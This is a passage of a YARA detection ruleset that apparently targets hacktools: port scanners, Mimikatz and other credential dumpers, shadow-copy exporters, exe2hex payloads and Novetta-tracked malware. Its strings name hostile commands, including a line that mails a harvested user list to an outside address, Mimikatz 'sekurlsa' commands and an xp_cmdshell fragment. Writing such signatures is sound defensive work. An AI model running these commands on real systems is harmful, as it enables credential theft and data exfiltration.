\"d5646e86b5257f9c83ea23eca3d86de336224e55\"\n\tstrings:\n\t\t$s0 = \"FScan v1.12 - Command line port scanner.\" fullword ascii\n\t\t$s2 = \" -n    - no port scanning - only pinging (unless you use -q)\" fullword ascii\n\t\t$s5 = \"Example: fscan -bp 80,100-200,443 10.0.0.1-10.0.1.200\" fullword ascii\n\t\t$s6 = \" -z    - maximum simultaneous threads to use for scanning\" fullword ascii\n\t\t$s12 = \"Failed to open the IP list file \\\"%s\\\"\" fullword ascii\n\t\t$s13 = \"http://www.foundstone.com\" fullword ascii\n\t\t$s16 = \" -p    - TCP port(s) to scan (a comma separated list of ports/ranges) \" fullword ascii\n\t\t$s18 = \"Bind port number out of range. Using system default.\" fullword ascii\n\t\t$s19 = \"fscan.exe\" fullword wide\n\tcondition:\n\t\t4 of them\n}\n\nrule _iissample_nesscan_twwwscan {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - from files iissample.exe, nesscan.exe, twwwscan.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\tsuper_rule = 1\n\t\thash0 = \"7f20962bbc6890bf48ee81de85d7d76a8464b862\"\n\t\thash1 = \"c0b1a2196e82eea4ca8b8c25c57ec88e4478c25b\"\n\t\thash2 = \"548f0d71ef6ffcc00c0b44367ec4b3bb0671d92f\"\n\tstrings:\n\t\t$s0 = \"Connecting HTTP Port - Result: \" fullword\n\t\t$s1 = \"No space for command line argument vector\" fullword\n\t\t$s3 = \"Microsoft(July/1999~) http://www.microsoft.com/technet/security/current.asp\" fullword\n\t\t$s5 = \"No space for copy of command line\" fullword\n\t\t$s7 = \"-  Windows NT,2000 Patch Method  - \" fullword\n\t\t$s8 = \"scanf : floating point formats not linked\" fullword\n\t\t$s12 = \"hrdir_b.c: LoadLibrary != mmdll borlndmm failed\" fullword\n\t\t$s13 = \"!\\\"what?\\\"\" fullword\n\t\t$s14 = \"%s Port %d Closed\" fullword\n\t\t$s16 = \"printf : floating point formats not linked\" fullword\n\t\t$s17 = \"xxtype.cpp\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule _FsHttp_FsPop_FsSniffer {\n\tmeta:\n\t\tdescription = \"Disclosed hacktool set (old stuff) - from files FsHttp.exe, FsPop.exe, FsSniffer.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"23.11.14\"\n\t\tscore = 60\n\t\tsuper_rule = 1\n\t\thash0 = \"9d4e7611a328eb430a8bb6dc7832440713926f5f\"\n\t\thash1 = \"ae23522a3529d3313dd883727c341331a1fb1ab9\"\n\t\thash2 = \"7ffc496cd4a1017485dfb571329523a52c9032d8\"\n\tstrings:\n\t\t$s0 = \"-ERR Invalid Command, Type [Help] For Command List\" fullword\n\t\t$s1 = \"-ERR Get SMS Users ID Failed\" fullword\n\t\t$s2 = \"Control Time Out 90 Secs, Connection Closed\" fullword\n\t\t$s3 = \"-ERR Post SMS Failed\" fullword\n\t\t$s4 = \"Current.hlt\" fullword\n\t\t$s6 = \"Histroy.hlt\" fullword\n\t\t$s7 = \"-ERR Send SMS Failed\" fullword\n\t\t$s12 = \"-ERR Change Password <New Password>\" fullword\n\t\t$s17 = \"+OK Send SMS Succussifully\" fullword\n\t\t$s18 = \"+OK Set New Password: [%s]\" fullword\n\t\t$s19 = \"CHANGE PASSWORD\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule Ammyy_Admin_AA_v3 {\n\tmeta:\n\t\tdescription = \"Remote Admin Tool used by APT group Anunak (ru) - file AA_v3.4.exe and AA_v3.5.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://goo.gl/gkAg2E\"\n\t\tdate = \"2014/12/22\"\n\t\tscore = 55\n\t\thash1 = \"b130611c92788337c4f6bb9e9454ff06eb409166\"\n\t\thash2 = \"07539abb2623fe24b9a05e240f675fa2d15268cb\"\n\tstrings:\n\t\t$x1 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrService.cpp\" fullword ascii\n\t\t$x2 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrDesktopCopyRect.cpp\" fullword ascii\n\t\t$x3 = \"Global\\\\Ammyy.Target.IncomePort\" fullword ascii\n\t\t$x4 = \"S:\\\\Ammyy\\\\sources\\\\target\\\\TrFmFileSys.cpp\" fullword ascii\n\t\t$x5 = \"Please enter password for accessing remote computer\" fullword ascii\n\n\t\t$s1 = \"CreateProcess1()#3 %d error=%d\" fullword ascii\n\t\t$s2 = \"CHttpClient::SendRequest2(%s, %s, %d) error: invalid host name.\" fullword ascii\n\t\t$s3 = \"ERROR: CreateProcessAsUser() error=%d, session=%d\" fullword ascii\n\t\t$s4 = \"ERROR: FindProcessByName('explorer.exe')\" fullword ascii\n\tcondition:\n\t\t2 of ($x*) or all of ($s*)\n}\n\n/* Other dumper and custom hack tools */\n\nrule LinuxHacktool_eyes_screen {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file screen\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"a240a0118739e72ff89cefa2540bf0d7da8f8a6c\"\n\tstrings:\n\t\t$s0 = \"or: %s -r [host.tty]\" fullword ascii\n\t\t$s1 = \"%s: process: character, ^x, or (octal) \\\\032 expected.\" fullword ascii\n\t\t$s2 = \"Type \\\"screen [-d] -r [pid.]tty.host\\\" to resume one of them.\" fullword ascii\n\t\t$s6 = \"%s: at [identifier][%%|*|#] command [args]\" fullword ascii\n\t\t$s8 = \"Slurped only %d characters (of %d) into buffer - try again\" fullword ascii\n\t\t$s11 = \"command from %s: %s %s\" fullword ascii\n\t\t$s16 = \"[ Passwords don't match - your armor crumbles away ]\" fullword ascii\n\t\t$s19 = \"[ Passwords don't match - checking turned off ]\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule LinuxHacktool_eyes_scanssh {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file scanssh\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"467398a6994e2c1a66a3d39859cde41f090623ad\"\n\tstrings:\n\t\t$s0 = \"Connection closed by remote host\" fullword ascii\n\t\t$s1 = \"Writing packet : error on socket (or connection closed): %s\" fullword ascii\n\t\t$s2 = \"Remote connection closed by signal SIG%s %s\" fullword ascii\n\t\t$s4 = \"Reading private key %s failed (bad passphrase ?)\" fullword ascii\n\t\t$s5 = \"Server closed connection\" fullword ascii\n\t\t$s6 = \"%s: line %d: list delimiter not followed by keyword\" fullword ascii\n\t\t$s8 = \"checking for version `%s' in file %s required by file %s\" fullword ascii\n\t\t$s9 = \"Remote host closed connection\" fullword ascii\n\t\t$s10 = \"%s: line %d: bad command `%s'\" fullword ascii\n\t\t$s13 = \"verifying that server is a known host : file %s not found\" fullword ascii\n\t\t$s14 = \"%s: line %d: expected service, found `%s'\" fullword ascii\n\t\t$s15 = \"%s: line %d: list delimiter not followed by domain\" fullword ascii\n\t\t$s17 = \"Public key from server (%s) doesn't match user preference (%s)\" fullword ascii\n\tcondition:\n\t\tall of them\n}\n\nrule LinuxHacktool_eyes_pscan2 {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file pscan2\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"56b476cba702a4423a2d805a412cae8ef4330905\"\n\tstrings:\n\t\t$s0 = \"# pscan completed in %u seconds. (found %d ips)\" fullword ascii\n\t\t$s1 = \"Usage: %s <b-block> <port> [c-block]\" fullword ascii\n\t\t$s3 = \"%s.%d.* (total: %d) (%.1f%% done)\" fullword ascii\n\t\t$s8 = \"Invalid IP.\" fullword ascii\n\t\t$s9 = \"# scanning: \" fullword ascii\n\t\t$s10 = \"Unable to allocate socket.\" fullword ascii\n\tcondition:\n\t\t2 of them\n}\n\nrule LinuxHacktool_eyes_a {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file a\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"458ada1e37b90569b0b36afebba5ade337ea8695\"\n\tstrings:\n\t\t$s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n\t\t$s1 = \"mv scan.log bios.txt\" fullword ascii\n\t\t$s2 = \"rm -rf bios.txt\" fullword ascii\n\t\t$s3 = \"echo -e \\\"# by Eyes.\\\"\" fullword ascii\n\t\t$s4 = \"././pscan2 $1 22\" fullword ascii\n\t\t$s10 = \"echo \\\"#cautam...\\\"\" fullword ascii\n\tcondition:\n\t\t2 of them\n}\n\nrule LinuxHacktool_eyes_mass {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file mass\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"2054cb427daaca9e267b252307dad03830475f15\"\n\tstrings:\n\t\t$s0 = \"cat trueusers.txt | mail -s \\\"eyes\\\" clubby@slucia.com\" fullword ascii\n\t\t$s1 = \"echo -e \\\"${BLU}Private Scanner By Raphaello , DeMMoNN , tzepelush & DraC\\\\n\\\\r\" ascii\n\t\t$s3 = \"killall -9 pscan2\" fullword ascii\n\t\t$s5 = \"echo \\\"[*] ${DCYN}Gata esti h4x0r ;-)${RES}  [*]\\\"\" fullword ascii\n\t\t$s6 = \"echo -e \\\"${DCYN}@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#@#${RES}\\\"\" fullword ascii\n\tcondition:\n\t\t1 of them\n}\n\nrule LinuxHacktool_eyes_pscan2_2 {\n\tmeta:\n\t\tdescription = \"Linux hack tools - file pscan2.c\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"not set\"\n\t\tdate = \"2015/01/19\"\n\t\thash = \"eb024dfb441471af7520215807c34d105efa5fd8\"\n\tstrings:\n\t\t$s0 = \"snprintf(outfile, sizeof(outfile) - 1, \\\"scan.log\\\", argv[1], argv[2]);\" fullword ascii\n\t\t$s2 = \"printf(\\\"Usage: %s <b-block> <port> [c-block]\\\\n\\\", argv[0]);\" fullword ascii\n\t\t$s3 = \"printf(\\\"\\\\n# pscan completed in %u seconds. (found %d ips)\\\\n\\\", (time(0) - sca\" ascii\n\t\t$s19 = \"connlist[i].addr.sin_family = AF_INET;\" fullword ascii\n\t\t$s20 = \"snprintf(last, sizeof(last) - 1, \\\"%s.%d.* (total: %d) (%.1f%% done)\\\",\" fullword ascii\n\tcondition:\n\t\t2 of them\n}\n\nrule CN_Portscan : APT\n{\n    meta:\n        description = \"CN Port Scanner\"\n        author = \"Florian Roth\"\n        release_date = \"2013-11-29\"\n        confidential = false\n\t\tscore = 70\n    strings:\n    \t$s1 = \"MZ\"\n\t\t$s2 = \"TCP 12.12.12.12\"\n    condition:\n        ($s1 at 0) and $s2\n}\n\nrule WMI_vbs : APT\n{\n    meta:\n        description = \"WMI Tool - APT\"\n        author = \"Florian Roth\"\n        release_date = \"2013-11-29\"\n        confidential = false\n\t\tscore = 70\n    strings:\n\t\t$s3 = \"WScript.Echo \\\"   $$\\\\      $$\\\\ $$\\\\      $$\\\\ $$$$$$\\\\ $$$$$$$$\\\\ $$\\\\   $$\\\\ $$$$$$$$\\\\  $$$$$$\"\n    condition:\n        all of them\n}\n\nrule CN_Toolset__XScanLib_XScanLib_XScanLib {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - from files XScanLib.dll, XScanLib.dll, XScanLib.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\tsuper_rule = 1\n\t\thash0 = \"af419603ac28257134e39683419966ab3d600ed2\"\n\t\thash1 = \"c5cb4f75cf241f5a9aea324783193433a42a13b0\"\n\t\thash2 = \"135f6a28e958c8f6a275d8677cfa7cb502c8a822\"\n\tstrings:\n\t\t$s1 = \"Plug-in thread causes an exception, failed to alert user.\" fullword\n\t\t$s2 = \"PlugGetUdpPort\" fullword\n\t\t$s3 = \"XScanLib.dll\" fullword\n\t\t$s4 = \"PlugGetTcpPort\" fullword\n\t\t$s11 = \"PlugGetVulnNum\" fullword\n\tcondition:\n\t\tall of them\n}\n\nrule CN_Toolset_NTscan_PipeCmd {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - file PipeCmd.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\thash = \"a931d65de66e1468fe2362f7f2e0ee546f225c4e\"\n\tstrings:\n\t\t$s2 = \"Please Use NTCmd.exe Run This Program.\" fullword ascii\n\t\t$s3 = \"PipeCmd.exe\" fullword wide\n\t\t$s4 = \"\\\\\\\\.\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s5 = \"%s\\\\pipe\\\\%s%s%d\" fullword ascii\n\t\t$s6 = \"%s\\\\ADMIN$\\\\System32\\\\%s%s\" fullword ascii\n\t\t$s7 = \"%s\\\\ADMIN$\\\\System32\\\\%s\" fullword ascii\n\t\t$s9 = \"PipeCmdSrv.exe\" fullword ascii\n\t\t$s10 = \"This is a service executable! Couldn't start directly.\" fullword ascii\n\t\t$s13 = \"\\\\\\\\.\\\\pipe\\\\PipeCmd_communicaton\" fullword ascii\n\t\t$s14 = \"PIPECMDSRV\" fullword wide\n\t\t$s15 = \"PipeCmd Service\" fullword ascii\n\tcondition:\n\t\t4 of them\n}\n\nrule CN_Toolset_LScanPortss_2 {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - file LScanPortss.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\thash = \"4631ec57756466072d83d49fbc14105e230631a0\"\n\tstrings:\n\t\t$s1 = \"LScanPort.EXE\" fullword wide\n\t\t$s3 = \"www.honker8.com\" fullword wide\n\t\t$s4 = \"DefaultPort.lst\" fullword ascii\n\t\t$s5 = \"Scan over.Used %dms!\" fullword ascii\n\t\t$s6 = \"www.hf110.com\" fullword wide\n\t\t$s15 = \"LScanPort Microsoft \" fullword wide\n\t\t$s18 = \"L-ScanPort2.0 CooFly\" fullword wide\n\tcondition:\n\t\t4 of them\n}\n\nrule CN_Toolset_sig_1433_135_sqlr {\n\tmeta:\n\t\tdescription = \"Detects a Chinese hacktool from a disclosed toolset - file sqlr.exe\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"http://qiannao.com/ls/905300366/33834c0c/\"\n\t\treference2 = \"https://raw.githubusercontent.com/Neo23x0/Loki/master/signatures/thor-hacktools.yar\"\n\t\tdate = \"2015/03/30\"\n\t\tscore = 70\n\t\thash = \"8542c7fb8291b02db54d2dc58cd608e612bfdc57\"\n\tstrings:\n\t\t$s0 = \"Connect to %s MSSQL server success. Type Command at Prompt.\" fullword ascii\n\t\t$s11 = \";DATABASE=master\" fullword ascii\n\t\t$s12 = \"xp_cmdshell '\" fullword ascii\n\t\t$s14 = \"SELECT * FROM OPENROWSET('SQLOLEDB','Trusted_Connection=Yes;Data Source=myserver\" ascii\n\tcondition:\n\t\tall of them\n}\n\n\n/* Mimikatz */\n\nrule Mimikatz_Memory_Rule_1 : APT {\n\tmeta:\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"12/22/2014\"\n\t\tscore = 70\n\t\ttype = \"memory\"\n\t\tdescription = \"Detects password dumper mimikatz in memory\"\n\tstrings:\n\t\t$s1 = \"sekurlsa::msv\" fullword ascii\n\t    $s2 = \"sekurlsa::wdigest\" fullword ascii\n\t    $s4 = \"sekurlsa::kerberos\" fullword ascii\n\t    $s5 = \"sekurlsa::tspkg\" fullword ascii\n\t    $s6 = \"sekurlsa::livessp\" fullword ascii\n\t    $s7 = \"sekurlsa::ssp\" fullword ascii\n\t    $s8 = \"sekurlsa::logonPasswords\" fullword ascii\n\t    $s9 = \"sekurlsa::process\" fullword ascii\n\t    $s10 = \"ekurlsa::minidump\" fullword ascii\n\t    $s11 = \"sekurlsa::pth\" fullword ascii\n\t    $s12 = \"sekurlsa::tickets\" fullword ascii\n\t    $s13 = \"sekurlsa::ekeys\" fullword ascii\n\t    $s14 = \"sekurlsa::dpapi\" fullword ascii\n\t    $s15 = \"sekurlsa::credman\" fullword ascii\n\tcondition:\n\t\t1 of them\n}\n\nrule Mimikatz_Memory_Rule_2 : APT {\n\tmeta:\n\t\tdescription = \"Mimikatz Rule generated from a memory dump\"\n\t\tauthor = \"Florian Roth - Florian Roth\"\n\t\ttype = \"memory\"\n\t\tscore = 80\n\tstrings:\n\t\t$s0 = \"sekurlsa::\" ascii\n\t\t$x1 = \"cryptprimitives.pdb\" ascii\n\t\t$x2 = \"Now is t1O\" ascii fullword\n\t\t$x4 = \"ALICE123\" ascii\n\t\t$x5 = \"BOBBY456\" ascii\n\tcondition:\n\t\t$s0 and 1 of ($x*)\n}\n\nrule mimikatz\n{\n\tmeta:\n\t\tdescription\t\t= \"mimikatz\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\t\ttool_author\t\t= \"Benjamin DELPY (gentilkiwi)\"\n      score          = 80\n\tstrings:\n\t\t$exe_x86_1\t\t= { 89 71 04 89 [0-3] 30 8d 04 bd }\n\t\t$exe_x86_2\t\t= { 89 79 04 89 [0-3] 38 8d 04 b5 }\n\n\t\t$exe_x64_1\t\t= { 4c 03 d8 49 [0-3] 8b 03 48 89 }\n\t\t$exe_x64_2\t\t= { 4c 8b df 49 [0-3] c1 e3 04 48 [0-3] 8b cb 4c 03 [0-3] d8 }\n\n\t\t$dll_1\t\t\t= { c7 0? 00 00 01 00 [4-14] c7 0? 01 00 00 00 }\n\t\t$dll_2\t\t\t= { c7 0? 10 02 00 00 ?? 89 4? }\n\n\t\t$sys_x86\t\t= { a0 00 00 00 24 02 00 00 40 00 00 00 [0-4] b8 00 00 00 6c 02 00 00 40 00 00 00 }\n\t\t$sys_x64\t\t= { 88 01 00 00 3c 04 00 00 40 00 00 00 [0-4] e8 02 00 00 f8 02 00 00 40 00 00 00 }\n\n\tcondition:\n\t\t(all of ($exe_x86_*)) or (all of ($exe_x64_*)) or (all of ($dll_*)) or (any of ($sys_*))\n}\n\n\nrule mimikatz_lsass_mdmp\n{\n\tmeta:\n\t\tdescription\t\t= \"LSASS minidump file for mimikatz\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\n\tstrings:\n\t\t$lsass\t\t\t= \"System32\\\\lsass.exe\"\twide nocase\n\n\tcondition:\n\t\t(uint32(0) == 0x504d444d) and $lsass\n}\n\nrule wce\n{\n\tmeta:\n\t\tdescription\t\t= \"wce\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\t\ttool_author\t\t= \"Hernan Ochoa (hernano)\"\n\n\tstrings:\n\t\t$hex_legacy\t\t= { 8b ff 55 8b ec 6a 00 ff 75 0c ff 75 08 e8 [0-3] 5d c2 08 00 }\n\t\t$hex_x86\t\t= { 8d 45 f0 50 8d 45 f8 50 8d 45 e8 50 6a 00 8d 45 fc 50 [0-8] 50 72 69 6d 61 72 79 00 }\n\t\t$hex_x64\t\t= { ff f3 48 83 ec 30 48 8b d9 48 8d 15 [0-16] 50 72 69 6d 61 72 79 00 }\n\n\tcondition:\n\t\tany of them\n}\n\n\nrule lsadump\n{\n\tmeta:\n\t\tdescription\t\t= \"LSA dump programe (bootkey/syskey) - pwdump and others\"\n\t\tauthor\t\t\t= \"Benjamin DELPY (gentilkiwi)\"\n\n\tstrings:\n\t\t$str_sam_inc\t= \"\\\\Domains\\\\Account\" ascii nocase\n\t\t$str_sam_exc\t= \"\\\\Domains\\\\Account\\\\Users\\\\Names\\\\\" ascii nocase\n\t\t$hex_api_call\t= {(41 b8 | 68) 00 00 00 02 [0-64] (68 | ba) ff 07 0f 00 }\n\t\t$str_msv_lsa\t= { 4c 53 41 53 52 56 2e 44 4c 4c 00 [0-32] 6d 73 76 31 5f 30 2e 64 6c 6c 00 }\n\t\t$hex_bkey\t\t= { 4b 53 53 4d [20-70] 05 00 01 00}\n\n\tcondition:\n\t\t( ($str_sam_inc and not $str_sam_exc) or $hex_api_call or $str_msv_lsa or $hex_bkey )\n      and not uint16(0) == 0x5a4d\n}\n\nrule Mimikatz_Logfile\n{\n\tmeta:\n\t\tdescription = \"Detects a log file generated by malicious hack tool mimikatz\"\n\t\tauthor = \"Florian Roth\"\n\t\tscore = 80\n\t\tdate = \"2015/03/31\"\n\t\treference = \"https://github.com/Neo23x0/Loki/blob/master/signatures/thor-hacktools.yar\"\n\tstrings:\n\t\t$s1 = \"SID               :\" ascii fullword\n\t\t$s2 = \"* NTLM     :\" ascii fullword\n\t\t$s3 = \"Authentication Id :\" ascii fullword\n\t\t$s4 = \"wdigest :\" ascii fullword\n\tcondition:\n\t\tall of them\n}\n\nrule AppInitHook {\n\tmeta:\n\t\tdescription = \"AppInitGlobalHooks-Mimikatz - Hide Mimikatz From Process Lists - file AppInitHook.dll\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://goo.gl/Z292v6\"\n\t\tdate = \"2015-07-15\"\n\t\tscore = 70\n\t\thash = \"e7563e4f2a7e5f04a3486db4cefffba173349911a3c6abd7ae616d3bf08cfd45\"\n\tstrings:\n\t\t$s0 = \"\\\\Release\\\\AppInitHook.pdb\" ascii\n\t\t$s1 = \"AppInitHook.dll\" fullword ascii\n\t\t$s2 = \"mimikatz.exe\" fullword wide\n\t\t$s3 = \"]X86Instruction->OperandSize >= Operand->Length\" fullword wide\n\t\t$s4 = \"mhook\\\\disasm-lib\\\\disasm.c\" fullword wide\n\t\t$s5 = \"mhook\\\\disasm-lib\\\\disasm_x86.c\" fullword wide\n\t\t$s6 = \"VoidFunc\" fullword ascii\n\tcondition:\n\t\tuint16(0) == 0x5a4d and filesize < 500KB and 4 of them\n}\n\nrule VSSown_VBS {\n\tmeta:\n\t\tdescription = \"Detects VSSown.vbs script - used to export shadow copy elements like NTDS to take away and crack elsewhere\"\n\t\tauthor = \"Florian Roth\"\n\t\tdate = \"2015-10-01\"\n\t\tscore = 75\n\tstrings:\n\t\t$s0 = \"Select * from Win32_Service Where Name ='VSS'\" ascii\n\t\t$s1 = \"Select * From Win32_ShadowCopy\" ascii\n\t\t$s2 = \"cmd /C mklink /D \" ascii\n\t\t$s3 = \"ClientAccessible\" ascii\n\t\t$s4 = \"WScript.Shell\" ascii\n\t\t$s5 = \"Win32_Process\" ascii\n\tcondition:\n\t\tall of them\n}\n\nrule wineggdrop : portscanner toolkit\n{\n    meta:\n        author = \"Christian Rebischke (@sh1bumi)\"\n        date = \"2015-09-05\"\n        description = \"Rules for TCP Portscanner VX.X by WinEggDrop\"\n        in_the_wild = true\n        family = \"Hackingtool/Portscanner\"\n\n    strings:\n        $a = { 54 43 50 20 50 6f 72 74 20 53 63 61 6e 6e 65 72 \n               20 56 3? 2e 3? 20 42 79 20 57 69 6e 45 67 67 44 \n               72 6f 70 0a } \n        $b = \"Result.txt\"\n        $c = \"Usage:   %s TCP/SYN StartIP [EndIP] Ports [Threads] [/T(N)] [/(H)Banner] [/Save]\\n\"\n\n    condition:\n        //check for MZ Signature at offset 0\n        uint16(0) == 0x5A4D\n\n        and\n\n        //check for wineggdrop specific strings\n        $a and $b and $c \n}\n\n\n/*\n    This Yara ruleset is under the GNU-GPLv2 license (http://www.gnu.org/licenses/gpl-2.0.html) and open to any user or organization, as    long as you use it under this license.\n\n*/\n\n/*\n\tYara Rule Set\n\tAuthor: Florian Roth\n\tDate: 2016-01-15\n\tIdentifier: Exe2hex\n*/\n\nrule Payload_Exe2Hex : toolkit {\n\tmeta:\n\t\tdescription = \"Detects payload generated by exe2hex\"\n\t\tauthor = \"Florian Roth\"\n\t\treference = \"https://github.com/g0tmi1k/exe2hex\"\n\t\tdate = \"2016-01-15\"\n\t\tscore = 70\n\tstrings:\n\t\t$a1 = \"set /p \\\"=4d5a\" ascii\n\t\t$a2 = \"powershell -Command \\\"$hex=\" ascii\n\t\t$b1 = \"set+%2Fp+%22%3D4d5\" ascii\n\t\t$b2 = \"powershell+-Command+%22%24hex\" ascii\n\t\t$c1 = \"echo 4d 5a \" ascii\n\t\t$c2 = \"echo r cx >>\" ascii\n\t\t$d1 = \"echo+4d+5a+\" ascii\n\t\t$d2 = \"echo+r+cx+%3E%3E\" ascii\n\tcondition:\n\t\tall of ($a*) or all of ($b*) or all of ($c*) or all of ($d*)\n}\n\nimport \"pe\"\n\nrule DeltaCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$rsaKey = {7B 4E 1E A7 E9 3F 36 4C DE F4 F0 99 C4 D9 B7 94 A1 FF F2 97 D3 91 13 9D C0 12 02 E4 4C BB 6C 77 48 EE 6F 4B  73 D7 1A 44 13 B3 6A BB 61 44 AF 31 47 E7 87 C2 AE 7A A7 2C 3A D9 5C 2E 42 1A A6 78 FE 2C AD ED 39 3F FA D0 AD 3D D9 C5 3F 58 A0 19 27 CC 27 C9 E8 D8 1E 7E EE 91 DD 13 B3 47 EF 57 1A CA FF 9A 60 E0 64 08 AA E2 92 D0}\n\t\t           \n\tcondition:\n\t\tany of them\n}\n\nimport \"pe\"\n\nrule HotelAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"58dab205ecb1e0972027eb92f68cec6d208e5ab5.ex_\"\n\n\tstrings:\n\t\n\t$resourceHTML = \"RSRC_HTML\"\n\t/*\n\t\t8A 0C 18  mov     cl, [eax+ebx]\n\t\t80 F1 63  xor     cl, 63h\n\t\t88 0C 18  mov     [eax+ebx], cl\n\t\t8B 4D 00  mov     ecx, [ebp+0]\n\t\t40        inc     eax\n\t\t3B C1     cmp     eax, ecx\n\t\t72 EF     jb      short loc_4010B4\n\t*/\n\n\t$rscsDecoderLoop = {8A [2] 80 F1 ?? 88 [2] 8B [2] 40 3B ?? 72 EF}\n\n\tcondition:\n\t\t$resourceHTML and $rscsDecoderLoop in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}\n\nrule IndiaAlfa_One\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"HwpFilePathCheck.dll\"\n\t\t$ = \"AdobeArm.exe\"\n\t\t$ = \"OpenDocument\"\n\t\t\n\tcondition:\n\t\t2 of them\n\n}\n\nrule IndiaAlfa_Two\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"ExePath: %s\\nXlsPath: %s\\nTmpPath: %s\\n\"\n\t\t\n\tcondition:\n\t\tany of them\n\n}\nimport \"pe\"\n\nrule IndiaBravo_PapaAlfa\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\n\tstrings:\n\t\t$ = \"pmsconfig.msi\" wide\n\t\t$ = \"scvrit001.bat\"\n\tcondition:\n\t\tall of them\n}\n\nrule IndiaBravo_RomeoCharlie\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = \"58ad28ac4fb911abb6a20382456c4ad6fe5c8ee5.ex_\"\n\t\tStatus = \"Signature is too loose to be useful.\"\n\t\t\n\tstrings:\n\t/*\n\t\t50                 push    eax             ; argp\n\t\t68 7E 66 04 80     push    8004667Eh       ; cmd\n\t\t8B 8D DC FE FF FF  mov     ecx, [ebp+skt]\n\t\t51                 push    ecx             ; s\n\t\tFF 15 58 31 41 00  call    ioctlsocket\n\t\t83 F8 FF           cmp     eax, 0FFFFFFFFh\n\t\t75 08              jnz     short loc_4043F0\n\t*/\n\n\t$a = {50 68 7E 66 04 80 8B 8D [4] 51 FF 15 [4] 83 F8 FF 75}\n\t$b1 = \"xc123465-efff-87cc-37abcdef9\"\n\t$b2 = \"[Check] - PORT ERROR...\" wide\n\t$b3 = \"%sd.e%sc n%ssh%srewa%s ad%s po%sop%sing T%s %d\"\n\n\tcondition:\n\t\t2 of ($b*) or \n\t\t$a in ((pe.sections[pe.section_index(\".text\")].raw_data_offset)..(pe.sections[pe.section_index(\".text\")].raw_data_offset + pe.sections[pe.section_index(\".text\")].raw_data_size))\n}\n\nrule IndiaBravo_RomeoBravo\n{\n\tmeta:\n\t\tcopyright = \"2015 Novetta Solutions\"\n\t\tauthor = \"Novetta Threat Research & Interdiction Group - trig@novetta.com\"\n\t\tSource = 